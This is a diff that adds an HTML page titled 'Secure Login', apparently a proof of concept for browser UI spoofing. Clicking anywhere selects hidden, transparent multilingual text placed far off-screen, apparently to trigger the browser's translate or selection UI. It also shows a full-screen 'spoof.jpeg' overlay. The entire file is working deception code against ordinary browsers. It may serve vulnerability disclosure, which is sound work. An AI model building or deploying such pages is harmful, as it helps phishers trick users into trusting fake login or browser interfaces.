@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html onmousedown="triggerSelect()" onclick="triggerSelect()">
+  <head>
+    <meta charset="UTF-8">
+    <title>Secure Login</title>
+    <style>
+      html, body {
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+        background: #fff;
+      }
+
+      #spoof {
+        display: none;
+        width: 100vw;
+        height: 100vh;
+        object-fit: cover;
+      }
+
+      #hiddenTrigger {
+        position: absolute;
+        top: 99999px;
+      }
+
+      #triggerText {
+        font-size: 16px;
+        color: transparent;
+        user-select: text;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Hidden image appears after trigger -->
+    <img id="spoof" src="spoof.jpeg" />
+
+    <!-- Translate menu trigger -->
+    <div id="hiddenTrigger">
+      <p id="triggerText">
+        これはテストです。هذا اختبار。Это тест.これはテストです。هذا اختبار.这是一个测试。
+      </p>
+    </div>
+
+    <script>
+      function triggerSelect() {
+        try {
+          document.execCommand("selectAll");
+          document.getElementById("spoof").style.display = "block";
+        } catch (e) {}
+      }
+    </script>
+  </body>
+</html>
